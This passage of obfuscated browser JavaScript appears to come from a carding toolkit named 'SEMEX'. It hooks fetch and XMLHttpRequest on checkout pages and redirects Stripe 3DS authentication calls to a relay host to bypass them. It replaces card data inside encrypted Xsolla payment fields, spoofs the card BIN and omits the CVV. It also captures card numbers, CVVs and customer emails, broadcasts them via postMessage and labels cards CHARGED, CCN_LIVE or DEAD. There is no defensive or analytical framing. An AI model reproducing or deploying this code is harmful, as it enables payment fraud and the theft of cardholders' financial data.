          var _0x2d1a2f;
          var _0x877095;
          var _0x20ed2e;
          var _0x3a767b;
          var _0x538c04;
          var _0xcd5c01;
          try {
            const _0x4a9b94 = JSON.parse(_0x2741f5);
            if (_0x4a9b94) {
              const _0x1b2d6f = __name((_0x2120a0, _0x22b2ff, _0x30277f) => {
                if (typeof _0x2120a0 !== "string") {
                  return null;
                }
                const _0x40598e = _0x2120a0.indexOf(_0x22b2ff);
                if (_0x40598e === -1) {
                  return null;
                }
                const _0x3d25b6 = _0x40598e + _0x22b2ff.length;
                const _0x4e20dd = _0x2120a0.indexOf(_0x30277f, _0x3d25b6);
                if (_0x4e20dd === -1) {
                  return null;
                }
                return _0x2120a0.substring(_0x3d25b6, _0x4e20dd);
              }, "extractString");
              const _0x40e8bd = __name((_0x675724, _0x12403b) => {
                var _0x55fd85;
                var _0x4a67ec;
                const _0x18cfe4 = ((_0x55fd85 = _0x675724.account_settings) == null ? undefined : _0x55fd85.business_url) || (_0x675724.invoice && _0x675724.invoice.account_settings && _0x675724.invoice.account_settings.business_url) || _0x1b2d6f(_0x12403b, "\"business_url\": \"", "\"") || _0x1b2d6f(_0x12403b, "\"business_url\":\"", "\"");
                const _0x1e0c97 = ((_0x4a67ec = _0x675724.completion_behavior) == null ? undefined : _0x4a67ec.redirect_url) || _0x1b2d6f(_0x12403b, "\"redirect_url\": \"", "\"");
                const _0x386dbe = _0x675724.success_url || _0x1b2d6f(_0x12403b, "\"success_url\": \"", "\"");
                const _0x56fd41 = _0x675724.cancel_url || _0x1b2d6f(_0x12403b, "\"cancel_url\": \"", "\"");
                const _0x27fb0d = _0x675724.return_url || _0x1b2d6f(_0x12403b, "\"return_url\": \"", "\"");
                const _0x3e3db4 = [_0x18cfe4, _0x1e0c97, _0x386dbe, _0x56fd41, _0x27fb0d];
                for (const _0x158b5c of _0x3e3db4) {
                  if (_0x158b5c && _0x158b5c !== "NA" && _0x158b5c !== "null" && typeof _0x158b5c === "string") {
                    try {
                      let _0x2c6a92 = _0x158b5c;
                      if (!_0x2c6a92.startsWith("http://") && !_0x2c6a92.startsWith("https://")) {
                        _0x2c6a92 = "https://" + _0x2c6a92;
                      }
                      const _0x3b8167 = new URL(_0x2c6a92);
                      if (_0x3b8167.hostname && !_0x3b8167.hostname.includes("stripe.com")) {
                        return _0x3b8167.protocol + "//" + _0x3b8167.hostname + "/";
                      }
                    } catch (_0x283d4f) {
                      continue;
                    }
                  }
                }
                return "N/A";
              }, "extractDomain");
              // Full success/return URL with the SAME fallback chain as the domain
              // extractor. Fixes hits that showed no success URL because only the
              // bare `success_url` field was checked — Stripe sometimes puts the
              // merchant return in redirect_url / return_url / cancel_url instead.
              const _semexPickSuccessUrl = __name((_0xobj, _0xraw) => {
                var _0xa5, _0xb6;
                const _cands = [
                  _0xobj.success_url || _0x1b2d6f(_0xraw, "\"success_url\": \"", "\"") || _0x1b2d6f(_0xraw, "\"success_url\":\"", "\""),
                  ((_0xa5 = _0xobj.completion_behavior) == null ? undefined : _0xa5.redirect_url) || _0x1b2d6f(_0xraw, "\"redirect_url\": \"", "\""),
                  _0xobj.return_url || _0x1b2d6f(_0xraw, "\"return_url\": \"", "\""),
                  // Invoice payloads nest the merchant URL under invoice/account
                  (_0xobj.invoice && _0xobj.invoice.account_settings && _0xobj.invoice.account_settings.business_url) || null,
                  (_0xobj.invoice && _0xobj.invoice.hosted_invoice_url) || null,
                  _0xobj.cancel_url || _0x1b2d6f(_0xraw, "\"cancel_url\": \"", "\""),
                  ((_0xb6 = _0xobj.account_settings) == null ? undefined : _0xb6.business_url) || _0x1b2d6f(_0xraw, "\"business_url\": \"", "\""),
                ];
                for (const _c of _cands) {
                  if (_c && _c !== "NA" && _c !== "null" && typeof _c === "string") {
                    let _u = _c;
                    if (!_u.startsWith("http://") && !_u.startsWith("https://")) _u = "https://" + _u;
                    return _u;
                  }
                }
                return null;
              }, "pickSuccessUrl");
              const _semexRawAmt = ((_0x3eccf2 = _0x4a9b94.invoice) == null ? undefined : _0x3eccf2.amount_due) || ((_0x2f498e = _0x4a9b94.invoice) == null ? undefined : _0x2f498e.total) || ((_0x37228e = _0x4a9b94.line_item_group) == null ? undefined : _0x37228e.total) || null;
              const _semexRawCur = ((_0x46e127 = _0x4a9b94.invoice) == null ? undefined : _0x46e127.currency) || ((_0xd5755e = _0x4a9b94.line_item_group) == null ? undefined : _0xd5755e.currency) || _0x4a9b94.currency || "USD";
              const _0x59d646 = {
                merchant: ((_0x57634a = _0x4a9b94.account_settings) == null ? undefined : _0x57634a.display_name) || _0x1b2d6f(_0x2741f5, "\"display_name\": \"", "\"") || "N/A",
                amount: _semexNormalizeStripeAmount(_semexRawAmt, _semexRawCur),
                currency: String(_semexRawCur || "USD").toUpperCase(),
                productName: ((_0x3bb245 = (_0x4a54b3 = (_0x5b0d5c = (_0x4f5382 = (_0x59dd53 = (_0x37a797 = _0x4a9b94.invoice) == null ? undefined : _0x37a797.lines) == null ? undefined : _0x59dd53.data) == null ? undefined : _0x4f5382[0]) == null ? undefined : _0x5b0d5c.price) == null ? undefined : _0x4a54b3.product) == null ? undefined : _0x3bb245.name) || ((_0x323746 = (_0x2ae6ba = (_0x2fb62f = (_0x548b9b = _0x4a9b94.invoice) == null ? undefined : _0x548b9b.lines) == null ? undefined : _0x2fb62f.data) == null ? undefined : _0x2ae6ba[0]) == null ? undefined : _0x323746.description) || ((_0x5c778e = (_0x35ab1b = (_0x4a5a91 = _0x4a9b94.line_item_group) == null ? undefined : _0x4a5a91.line_items) == null ? undefined : _0x35ab1b[0]) == null ? undefined : _0x5c778e.name) || ((_0x538c04 = (_0x3a767b = (_0x20ed2e = (_0x877095 = (_0x2d1a2f = _0x4a9b94.line_item_group) == null ? undefined : _0x2d1a2f.line_items) == null ? undefined : _0x877095[0]) == null ? undefined : _0x20ed2e.price) == null ? undefined : _0x3a767b.product) == null ? undefined : _0x538c04.name) || _0x1b2d6f(_0x2741f5, "\"name\": \"", "\"") || "N/A",
                domain: _0x40e8bd(_0x4a9b94, _0x2741f5),
                successUrl: _semexPickSuccessUrl(_0x4a9b94, _0x2741f5),
                // Invoice/billing pages often nest the email under invoice.* or
                // only expose it as receipt_email / charge billing_details — and
                // raw JSON may be unspaced ("email":"x@y") — so widen the chain.
                customerEmail: _0x4a9b94.customer_email
                  || ((_0xcd5c01 = _0x4a9b94.customer) == null ? undefined : _0xcd5c01.email)
                  || (_0x4a9b94.invoice && (_0x4a9b94.invoice.customer_email || (_0x4a9b94.invoice.customer && _0x4a9b94.invoice.customer.email)))
                  || _0x4a9b94.receipt_email
                  || _0x1b2d6f(_0x2741f5, "\"customer_email\": \"", "\"") || _0x1b2d6f(_0x2741f5, "\"customer_email\":\"", "\"")
                  || _0x1b2d6f(_0x2741f5, "\"receipt_email\": \"", "\"")
                  || _0x1b2d6f(_0x2741f5, "\"email\": \"", "\"") || _0x1b2d6f(_0x2741f5, "\"email\":\"", "\"")
                  || null,
                // Hosted invoice/billing capture: the invoice's public URL and its
                // human-readable number. Prefer the response's hosted_invoice_url,
                // fall back to the raw payload, then the current page URL.
                invoiceUrl: ((_0x4a9b94.invoice || {}).hosted_invoice_url) || _0x1b2d6f(_0x2741f5, "\"hosted_invoice_url\": \"", "\"") || (window.location.href.includes("invoice.stripe.com") ? window.location.href : null),
                invoiceNumber: ((_0x4a9b94.invoice || {}).number) || _0x1b2d6f(_0x2741f5, "\"number\": \"", "\"") || null
              };
              window.IS_STRIPE_CHECKOUT = true;
              try {
                sessionStorage.setItem("IS_STRIPE_CHECKOUT", "true");
              } catch (_0x368159) {}
              window.postMessage({
                type: "STRIPE_CHECKOUT_DETECTED",
                url: window.location.href
              }, "*");
              window.postMessage({
                type: "SITE_INFO_EXTRACTED",
                siteInfo: _0x59d646
              }, "*");
            }
          } catch (_0x4482b6) {}
        }).catch(_0x48aea3 => {});
      }
      // v2.8.6 — 3DS bypass failure detection hardened:
      // (1) the flag is cleared after the FIRST proxied response regardless of
      //     outcome (previously only cleared on a detected failure, so a stale
      //     flag could mislabel a later unrelated 4xx as 3ds_bypass_failed),
      // (2) failure is recognized on any 4xx/5xx whose JSON body carries an
      //     error/message field — not only the literal "invalid json" text,
      //     which newer relay builds no longer always send,
      // (3) the merchant page is told to recover (unfreeze) via the same
      //     DEAD postMessage the UI already listens for.
      if (window.__CHECK_3DS_FAILURE) {
        window.__CHECK_3DS_FAILURE = false;
        if (_0x4f3296.status >= 400) {
          const _0x46a539 = _0x4f3296.clone();
          _0x46a539.json().then(_0x1e4cae => {
            const _0xmsg = _0x1e4cae && _0x1e4cae.error && (_0x1e4cae.error.message || _0x1e4cae.error.type || _0x1e4cae.error.code);
            const _0xplain = _0x1e4cae && (_0x1e4cae.message || _0x1e4cae.error_description);
            if (_0xmsg || _0xplain) {
              window.postMessage({
                type: "PAYMENT_STATUS_DETECTED",
                url: _0x561120,
                status: "DEAD",
                gateway: "STRIPE",
                declineCode: "3ds_bypass_failed",
                errorCode: "3ds_bypass_failed",
                card: window.__LAST_CAPTURED_CARD || null
              }, "*");
            }
          }).catch(_0x1457ba => {
            // Non-JSON error body from the relay — still a bypass failure.
            window.postMessage({
              type: "PAYMENT_STATUS_DETECTED",
              url: _0x561120,
              status: "DEAD",
              gateway: "STRIPE",
              declineCode: "3ds_bypass_failed",
              errorCode: "3ds_bypass_failed",
              card: window.__LAST_CAPTURED_CARD || null
            }, "*");
          });
        }
      }
      const _0x216c21 = _0x561120 && _0x561120.includes("/payment_pages/") && _0x561120.includes("/init");
      if (_0x4f3296.status >= 200 && _0x4f3296.status < 500 && _0x58db0a(_0x561120) && !_0x216c21) {
        const _0x3ced37 = _0x4f3296.clone();
        _0x3ced37.json().then(_0x496b05 => {
          var _0x584565;
          var _0x34cb5a;
          var _0x58daf9;
          var _0x248f3b;
          var _0x5a313f;
          var _0x169999;
          var _0x4002a8;
          var _0x40019b;
          const _0x3ca637 = window.lastInterceptedCardData || window.__LAST_CAPTURED_CARD || null;
          const _0x45fb23 = (_0x561120 || "").toLowerCase();
          const _0x3c1144 = _0x45fb23.includes("xsolla.com") || _0x45fb23.includes("directpayment") || window.location.hostname.includes("xsolla.com");
          let _0x3f16ab = null;
          if (_0x3c1144 && _0x496b05 && typeof _0x496b05 === "object") {
            let _0x28ac2f = "";
            const _0x3db585 = (_0x584565 = _0x496b05 == null ? undefined : _0x496b05.status) == null ? undefined : _0x584565.group;
            const _0x157075 = (_0x58daf9 = (_0x34cb5a = _0x496b05 == null ? undefined : _0x496b05.status) == null ? undefined : _0x34cb5a.statusData) == null ? undefined : _0x58daf9.stateText;
            const _0x31088c = (_0x5a313f = (_0x248f3b = _0x496b05 == null ? undefined : _0x496b05.status) == null ? undefined : _0x248f3b.statusData) == null ? undefined : _0x5a313f.state;
            const _0x1abb31 = (_0x169999 = _0x496b05 == null ? undefined : _0x496b05.status) == null ? undefined : _0x169999.title_class;
            const _0x14cb09 = ["done", "success", "completed", "authorized"];
            const _0x428d93 = ["failed", "declined", "error", "cancelled", "canceled"];
            if (_0x14cb09.includes(_0x3db585) || _0x14cb09.includes(_0x157075) || _0x14cb09.includes(_0x1abb31) || _0x31088c === 1) {
              _0x3f16ab = "CHARGED";
              _0x28ac2f = "Xsolla Payment Successful";
            } else if ((_0x496b05 == null ? undefined : _0x496b05.errors) && Array.isArray(_0x496b05.errors) && _0x496b05.errors.length > 0) {
              const _0x12c1b2 = _0x496b05.errors[0];
              const _0x5c740c = _0x12c1b2 == null ? undefined : _0x12c1b2.code;
              const _0x5bce56 = (_0x12c1b2 == null ? undefined : _0x12c1b2.message) || "Unknown Error";
              if (_0x5c740c === 3032) {
                _0x3f16ab = "DEAD";
                _0x28ac2f = "Account Banned";
              } else if (_0x5bce56.toLowerCase().includes("insufficient funds") || _0x5bce56.toLowerCase().includes("not enough")) {
                _0x3f16ab = "CCN_LIVE";
                _0x28ac2f = _0x5bce56;
              } else {
                _0x3f16ab = "DEAD";
                _0x28ac2f = _0x5bce56;
              }
            } else if (_0x428d93.includes(_0x3db585) || _0x428d93.includes(_0x157075) || _0x428d93.includes(_0x1abb31) || _0x31088c === 2) {
              _0x3f16ab = "DEAD";
              _0x28ac2f = ((_0x40019b = (_0x4002a8 = _0x496b05 == null ? undefined : _0x496b05.status) == null ? undefined : _0x4002a8.text) == null ? undefined : _0x40019b.state) || "Xsolla Payment Declined";
            }
            if (_0x3f16ab) {
              const _0x582cad = {
                type: "PAYMENT_STATUS_DETECTED",
                status: _0x3f16ab,
                message: _0x28ac2f,
                gateway: "Xsolla",
                card: _0x3ca637,
                url: _0x561120 || window.location.href
              };
              const _0x5f0938 = window.parent && window.parent !== window;
              if (_0x5f0938) {
                try {
                  window.parent.postMessage(_0x582cad, "*");
                } catch (_0x178818) {
                  window.postMessage(_0x582cad, "*");
                }
              } else {
                window.postMessage(_0x582cad, "*");
              }
            }
          }
          if (_0x3c1144 && _0x3f16ab) {
            return;
          }
          window.postMessage({
            type: "SEMEX_NETWORK_RESPONSE",
            url: _0x561120,
            response: _0x496b05,
            status: _0x4f3296.status,
            card: _0x3ca637
          }, "*");
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage({
                type: "SEMEX_NETWORK_RESPONSE",
                url: _0x561120,
                response: _0x496b05,
                status: _0x4f3296.status,
                card: _0x3ca637
              }, "*");
            }
          } catch (_0x4ae2d0) {}
        }).catch(_0x4eb334 => {});
      }
    } catch (_0x4f3cf8) {}
    return _0x4f3296;
  };
  const _0x23571a = window.XMLHttpRequest.prototype;
  const _0x38f7cc = _0x23571a.open;
  const _0x3ec4ed = _0x23571a.send;
  _0x23571a.open = function (_0x224910, _0x19b2cc) {
    var _0x42e73a;
    var _0x4e728c;
    this._method = (_0x224910 || "GET").toUpperCase();
    this._url = _0x19b2cc;
    // Cloudflare challenge / Turnstile XHR must pass through untouched — see
    // the fetch hook above. Mark it so send() skips interception too.
    // Always write the flag as an OWN property on every open(): an XHR object
    // can be reused via a second open(), so a stale `true` (or a page-set
    // prototype property) must never leak into a later payment request.
    this._semexCF = false;
    try {
      if (_semexIsCloudflareURL(_0x19b2cc)) {
        this._semexCF = true;
        return _0x38f7cc.apply(this, arguments);
      }
    } catch (_semexCFE) {}
    try {
      const _0x48b634 = window.SEMEX_SETTINGS || {};
      const _0x342fc5 = window.SEMEX_SESSION_RULES || {};
      const _0x54269f = ((_0x42e73a = _0x48b634.threeDSBypass) == null ? undefined : _0x42e73a.enabled) ?? true;
      if (_0x54269f && ((_0x4e728c = _0x342fc5 == null ? undefined : _0x342fc5.stripe3ds) == null ? undefined : _0x4e728c.enabled) && _0x19b2cc && _0x19b2cc.includes("/3ds2/authenticate") && _0x19b2cc.includes("api.stripe.com")) {
        const _0x97efd2 = _0x342fc5.stripe3ds.targetHost;
        if (_0x97efd2) {
          const _0x36d0cf = _0x19b2cc.replace("api.stripe.com", _0x97efd2);
          this._url = _0x36d0cf;
          this._is3DSProxy = true;
          return _0x38f7cc.apply(this, [_0x224910, _0x36d0cf, ...Array.prototype.slice.call(arguments, 2)]);
        }
      }
    } catch (_0x26da34) {}
    return _0x38f7cc.apply(this, arguments);
  };
  _0x23571a.send = function (_0x3e1a43) {
    var _0x3bdabc;
    var _0x1d6f64;
    var _0x1c6528;
    var _0x2950a6;
    var _0x2689f6;
    var _0x4de2bc;
    var _0x3f0526;
    const _0x11ff08 = this._method || "GET";
    // Cloudflare-marked request (see open()) — never intercept.
    if (this._semexCF) {
      return _0x3ec4ed.apply(this, arguments);
    }
    const _0x36061f = _0x11ff08 === "POST" || _0x11ff08 === "PUT" || _0x11ff08 === "PATCH";
    const _0x3c108b = _0x11ff08 === "GET" && this._url && this._url.includes("api.stripe.com") && (this._url.includes("/payment_intents/") || this._url.includes("/setup_intents/"));
    if (!_0x36061f && !_0x3c108b) {
      return _0x3ec4ed.apply(this, arguments);
    }
    if (this._is3DSProxy) {
      window.__CHECK_3DS_FAILURE = true;
      window.postMessage({
        type: "SEMEX_TOAST",
        messageType: "BYPASS_ACTIVATED",
        gateway: "STRIPE",
        bypassTypes: ["3DS"],
        url: this._url
      }, "*");
    }
    if (this._url && this._url.includes("admin-ajax.php")) {
      let _0x16ee8b = false;
      try {
        if (_0x3e1a43 && typeof _0x3e1a43 === "string") {
          if (_0x3e1a43.includes("wc-stripe") || _0x3e1a43.includes("action=wc_stripe") || _0x3e1a43.includes("stripe_payment")) {
            _0x16ee8b = true;
          }
        } else if (_0x3e1a43 instanceof FormData) {}
      } catch (_0x2ff239) {}
      if (!_0x16ee8b) {
        return _0x3ec4ed.apply(this, arguments);
      }
    }
    let _0x541967 = _0x3e1a43;
    const _0x1331de = this._url && this._url.toLowerCase();
    const _0x48f93d = _0x1331de && _0x1331de.includes("xsolla.com") || _0x1331de && _0x1331de.includes("directpayment") || window.location.hostname.includes("xsolla.com");
    const _0x412e47 = _0x1331de && _0x1331de.includes("directpayment");
    if (_0x36061f && _0x3e1a43 && _0x412e47) {
      let _0x22b3cf = null;
      if (typeof _0x3e1a43 === "string") {
        _0x22b3cf = _0x3e1a43;
      } else if (_0x3e1a43 instanceof URLSearchParams) {
        _0x22b3cf = _0x3e1a43.toString();
      } else if (_0x3e1a43 instanceof FormData) {
        const _0x1fc75c = new URLSearchParams();
        try {
          for (const [_0x5e4d08, _0x156e00] of _0x3e1a43.entries()) {
            _0x1fc75c.append(_0x5e4d08, typeof _0x156e00 === "string" ? _0x156e00 : String(_0x156e00));
          }
          _0x22b3cf = _0x1fc75c.toString();
        } catch (_0x53974f) {}
      }
      if (_0x22b3cf && _0x22b3cf.includes("xps_encrypted_card")) {
        const _0x30127c = window.SEMEX_SETTINGS || {};
        const _0x3be608 = ((_0x3bdabc = _0x30127c.cvvBypass) == null ? undefined : _0x3bdabc.enabled) && (((_0x1c6528 = (_0x1d6f64 = _0x30127c.cvvBypass) == null ? undefined : _0x1d6f64.gateways) == null ? undefined : _0x1c6528.xsolla) ?? true);
        const _0xa3c79a = ((_0x2950a6 = _0x30127c.cardReplacement) == null ? undefined : _0x2950a6.enabled) && (((_0x4de2bc = (_0x2689f6 = _0x30127c.cardReplacement) == null ? undefined : _0x2689f6.gateways) == null ? undefined : _0x4de2bc.xsolla) ?? true);
        if (_semexNotifyCardReplacementOff("xsolla")) {} else if (_0x3be608 || _0xa3c79a) {
          const _0x127f3c = _0x22b3cf.match(/xps_public_key=([^&]+)/);
          if (_0x127f3c) {
            let _0x357c71 = null;
            try {
              const _0x39ab50 = _0x127f3c[1];
              _0x357c71 = atob(decodeURIComponent(_0x39ab50).replace(/\s+/g, ""));
              if (!/BEGIN PUBLIC KEY/.test(_0x357c71)) {
                _0x357c71 = null;
              }
            } catch (_0x1c8745) {}
            if (_0x357c71) {
              const _0x5f5ad6 = _0xb1076a();
              if (_0x5f5ad6 && _0x5f5ad6.number && typeof window.JSEncrypt === "function") {
                let _0x4f33ff = String(_0x5f5ad6.exp_year || _0x5f5ad6.year || "");
                if (_0x4f33ff.length > 2) {
                  _0x4f33ff = _0x4f33ff.slice(-2);
                }
                const _0x37e2d3 = {
                  card_number: _0x5f5ad6.number,
                  card_year: _0x4f33ff,
                  card_month: String(_0x5f5ad6.exp_month || _0x5f5ad6.month || "").padStart(2, "0"),
                  cvv: _0x3be608 ? undefined : _0x5f5ad6.cvc || _0x5f5ad6.cvv
                };
                try {
                  const _0x2251ad = new window.JSEncrypt();
                  _0x2251ad.setPublicKey(_0x357c71);
                  const _0x28bfbf = _0x2251ad.encrypt(JSON.stringify(_0x37e2d3));
                  if (_0x28bfbf) {
                    const _0x1b9ce0 = (_0x3f0526 = _0x30127c.threeDSBypass) == null ? undefined : _0x3f0526.enabled;
                    const _0x2a387d = {
                      card_bin: _0x1b9ce0 ? "414720" : _0x5f5ad6.number.slice(0, 6),
                      card_suffix: _0x5f5ad6.number.slice(-4),
                      card_year: _0x4f33ff,
                      card_month: String(_0x5f5ad6.exp_month || _0x5f5ad6.month || "").padStart(2, "0")
                    };
                    let _0x1cc62e = _0x22b3cf;
                    _0x1cc62e = _0x1cc62e.replace(/(xps_encrypted_card=)[^&]*/, "$1" + encodeURIComponent(_0x28bfbf));
                    _0x1cc62e = _0x1cc62e.replace(/(xps_open_card=)[^&]*/, "$1" + encodeURIComponent(JSON.stringify(_0x2a387d)));
                    _0x541967 = _0x1cc62e;
                    window.postMessage({
                      type: "CARD_REPLACED",
                      card: _0x5f5ad6
                    }, "*");
                    window.__LAST_CAPTURED_CARD = {
                      number: _0x5f5ad6.number,
                      month: _0x5f5ad6.exp_month || _0x5f5ad6.month,
                      year: _0x5f5ad6.exp_year || _0x5f5ad6.year,
                      cvv: _0x5f5ad6.cvc || _0x5f5ad6.cvv
                    };
                    if (_0x3be608) {
                      window.postMessage({
                        type: "SEMEX_TOAST",
                        messageType: "BYPASS_ACTIVATED",
                        gateway: "Xsolla",
                        bypassTypes: ["CVV"],
                        url: this._url
                      }, "*");
                    }
                  } else {}
                } catch (_0x1d693f) {}
              } else {}
            } else {}
          } else {}
        }
      }
    }
    if (_0x36061f && _0x541967 && _0x541967 === _0x3e1a43) {
      _0x541967 = _0x2cff8b(_0x3e1a43, this._url);
    } else if (_0x36061f && _0x3e1a43 && !_0x412e47) {
      _0x541967 = _0x2cff8b(_0x3e1a43, this._url);
    }
    try {
      const _0x3affcf = _0x29b65c(this._url);
      if (_0x3affcf && _0x541967) {
        const _0x1040b9 = _0xd23bbe(_0x541967);
        if (_0x1040b9) {
          _0x435696(_0x1040b9);
        }
      }
    } catch (_0xde2d4c) {}
    this.addEventListener("load", function () {
      var _0x54fa00;
      var _0x42e1d4;
      var _0x27d3ed;
      var _0x1211fa;
      var _0x34c125;
      var _0x3e8e69;
      var _0x114469;
      var _0x55bc3d;
      try {
        const _0x1dd345 = this._url && this._url.includes("/payment_pages/") && this._url.includes("/init");
        if (this.status >= 200 && this.status < 500 && _0x58db0a(this._url) && !_0x1dd345) {
          let _0x592c3c;
          try {
            _0x592c3c = JSON.parse(this.responseText);
          } catch (_0x2e5cda) {
            _0x592c3c = this.responseText;
          }
          const _0x1f87a5 = window.lastInterceptedCardData || window.__LAST_CAPTURED_CARD || null;
          const _0x365979 = (this._url || "").toLowerCase();
          const _0x4a73fa = _0x365979.includes("xsolla.com") || _0x365979.includes("directpayment") || window.location.hostname.includes("xsolla.com");
          let _0x2e50cd = null;
          if (_0x4a73fa && _0x592c3c && typeof _0x592c3c === "object") {
            let _0x4025a3 = "";
            const _0x3e5325 = (_0x54fa00 = _0x592c3c == null ? undefined : _0x592c3c.status) == null ? undefined : _0x54fa00.group;
            const _0x150e78 = (_0x27d3ed = (_0x42e1d4 = _0x592c3c == null ? undefined : _0x592c3c.status) == null ? undefined : _0x42e1d4.statusData) == null ? undefined : _0x27d3ed.stateText;
            const _0x121d52 = (_0x34c125 = (_0x1211fa = _0x592c3c == null ? undefined : _0x592c3c.status) == null ? undefined : _0x1211fa.statusData) == null ? undefined : _0x34c125.state;
            const _0x36da89 = (_0x3e8e69 = _0x592c3c == null ? undefined : _0x592c3c.status) == null ? undefined : _0x3e8e69.title_class;
            const _0x222cce = ["done", "success", "completed", "authorized"];
            const _0xeaff01 = ["failed", "declined", "error", "cancelled", "canceled"];
            if (_0x222cce.includes(_0x3e5325) || _0x222cce.includes(_0x150e78) || _0x222cce.includes(_0x36da89) || _0x121d52 === 1) {
              _0x2e50cd = "CHARGED";
              _0x4025a3 = "Xsolla Payment Successful";
            } else if ((_0x592c3c == null ? undefined : _0x592c3c.errors) && Array.isArray(_0x592c3c.errors) && _0x592c3c.errors.length > 0) {
              const _0x43b7f0 = _0x592c3c.errors[0];
              const _0x599f5e = _0x43b7f0 == null ? undefined : _0x43b7f0.code;
              const _0x568df3 = (_0x43b7f0 == null ? undefined : _0x43b7f0.message) || "Unknown Error";
              if (_0x599f5e === 3032) {
                _0x2e50cd = "DEAD";
                _0x4025a3 = "Account Banned";
              } else if (_0x568df3.toLowerCase().includes("insufficient funds") || _0x568df3.toLowerCase().includes("not enough")) {
                _0x2e50cd = "CCN_LIVE";
                _0x4025a3 = _0x568df3;
              } else {
                _0x2e50cd = "DEAD";
                _0x4025a3 = _0x568df3;
              }
            } else if (_0xeaff01.includes(_0x3e5325) || _0xeaff01.includes(_0x150e78) || _0xeaff01.includes(_0x36da89) || _0x121d52 === 2) {
              _0x2e50cd = "DEAD";
              _0x4025a3 = ((_0x55bc3d = (_0x114469 = _0x592c3c == null ? undefined : _0x592c3c.status) == null ? undefined : _0x114469.text) == null ? undefined : _0x55bc3d.state) || "Xsolla Payment Declined";
            }
            if (_0x2e50cd) {
              const _0x445713 = {
                type: "PAYMENT_STATUS_DETECTED",
                status: _0x2e50cd,
                message: _0x4025a3,
                gateway: "Xsolla",
                card: _0x1f87a5,
                url: this._url || window.location.href
              };
              const _0x34c9ba = window.parent && window.parent !== window;
              if (_0x34c9ba) {
                try {
                  window.parent.postMessage(_0x445713, "*");
                } catch (_0x785c97) {
                  window.postMessage(_0x445713, "*");
                }
              } else {
                window.postMessage(_0x445713, "*");
              }
            }
          }
          if (_0x4a73fa && _0x2e50cd) {
            return;
          }
          window.postMessage({
            type: "SEMEX_NETWORK_RESPONSE",
            url: this._url,
            response: _0x592c3c,
            status: this.status,
            card: _0x1f87a5
          }, "*");
          try {
            if (window.parent && window.parent !== window) {
              window.parent.postMessage({
                type: "SEMEX_NETWORK_RESPONSE",
                url: this._url,
                response: _0x592c3c,
                status: this.status,
                card: _0x1f87a5
              }, "*");
            }
          } catch (_0x2adc4d) {}
        }
      } catch (_0x450460) {}
    });
    return _0x3ec4ed.call(this, _0x541967);
  };
  function _0x2cff8b(_0x4ce519, _0x4b483a) {
    var _0x575b8d;
    var _0x2fb02c;
    var _0x259c71;
    var _0x116529;
    var _0x6905d9;
    var _0x54da80;
    var _0x5a2e0b;
    var _0x53a6bb;
    var _0x3229ff;
    var _0x3a6a56;
    var _0x37ebdf;
    var _0x218c2e;
    var _0x2d120b;
    var _0x1c630f;
    var _0x48f3bc;
    var _0x260b7f;
    var _0x319383;
    var _0x2d580f;
    var _0xa046fe;
    var _0x311f13;
    var _0x56a84d;
    var _0x5a0f5d;
    var _0x33c18b;
    var _0x408a94;
    var _0x262574;
    var _0x3a634d;
    var _0x4e5230;
    var _0x2f1b23;
    var _0x2c9e21;
    var _0x1bca2e;
    var _0x4a478b;
    var _0x140ae6;
    var _0x37dcda;
    var _0x5ce8ab;
    var _0x432933;
    var _0xd026f7;
    var _0x127185;
    var _0x3a78a5;
    var _0x42095c;
    var _0x2467de;
    var _0x1be93f;
    var _0x1f1a86;
    var _0x29308b;
    var _0x565e49;
    var _0x1a36a9;
    var _0x4a7835;
    if (!_0x4ce519 || typeof _0x4ce519 !== "string") {
      return _0x4ce519;
    }
    const _0x2ec52a = (_0x4b483a || "").toLowerCase();
    let _0x4d64c8 = false;
    let _0x736f4e = null;
    if (["analytics", "fingerprint", "pixel", "telemetry", "log", "metric", "report"].some(_0x20cb70 => _0x2ec52a.toLowerCase().includes(_0x20cb70))) {
      return _0x4ce519;
    }
    const _0x5d58ae = window.SEMEX_SETTINGS || {};
    const _0x11baae = ((_0x575b8d = _0x5d58ae.cvvBypass) == null ? undefined : _0x575b8d.enabled) ?? true;
    const _0x509701 = ((_0x2fb02c = _0x5d58ae.paymentUserAgentBypass) == null ? undefined : _0x2fb02c.enabled) ?? true;
    const _0x209695 = ((_0x259c71 = _0x5d58ae.cardReplacement) == null ? undefined : _0x259c71.enabled) && (((_0x6905d9 = (_0x116529 = _0x5d58ae.cardReplacement) == null ? undefined : _0x116529.gateways) == null ? undefined : _0x6905d9.stripe) || ((_0x5a2e0b = (_0x54da80 = _0x5d58ae.cardReplacement) == null ? undefined : _0x54da80.gateways) == null ? undefined : _0x5a2e0b.adyen) || ((_0x3229ff = (_0x53a6bb = _0x5d58ae.cardReplacement) == null ? undefined : _0x53a6bb.gateways) == null ? undefined : _0x3229ff.checkout) || ((_0x37ebdf = (_0x3a6a56 = _0x5d58ae.cardReplacement) == null ? undefined : _0x3a6a56.gateways) == null ? undefined : _0x37ebdf.recurly) || ((_0x2d120b = (_0x218c2e = _0x5d58ae.cardReplacement) == null ? undefined : _0x218c2e.gateways) == null ? undefined : _0x2d120b.xsolla));
    if (!_0x11baae && !_0x509701 && !_0x209695) {
      return _0x4ce519;
    }
    try {
      let _0x1dff51 = [];
      const _0x527a68 = _0x2ec52a.includes("adyen.com") || _0x2ec52a.includes("/adyen") || _0x2ec52a.includes("checkoutshopper") || _0x2ec52a.includes("api.gog.com/v1/checkout");
      const _0x333c70 = _0x2ec52a.includes("checkout.com") && _0x2ec52a.includes("/tokens");
      const _0x239b0e = _0x2ec52a.includes("api.stripe.com");
      const _0x4612ef = _0x2ec52a.includes("api.recurly.com/js/v1/token");
      if (_0x527a68) {
        const _0x1489cd = ["binlookup", "setup", "analytics", "log", "fingerprint", "telemetry", "paymentdetails", "/complete", "securedfields", "/tokenize"];
        if (_0x1489cd.some(_0x3fe91b => _0x2ec52a.toLowerCase().includes(_0x3fe91b.toLowerCase()))) {
          _0xf8ac0b("[SEMEX DEBUG] Adyen endpoint ignored (non-payment):", _0x2ec52a);
          return _0x4ce519;
        }
        const _0x23ceb2 = ["/payments", "/checkout", "/details", "/subscription", "/payment"];
        const _0x86dd9a = _0x23ceb2.some(_0x3df7b6 => _0x2ec52a.includes(_0x3df7b6));
        if (!_0x86dd9a) {
          _0x5c07cd("[SEMEX DEBUG] Adyen URL does NOT match payment patterns:", _0x2ec52a);
          _0x5c07cd("[SEMEX DEBUG] This might cause bypass to fail. URL should contain: /payments, /checkout, /details, /subscription, or /payment");
          return _0x4ce519;
        }
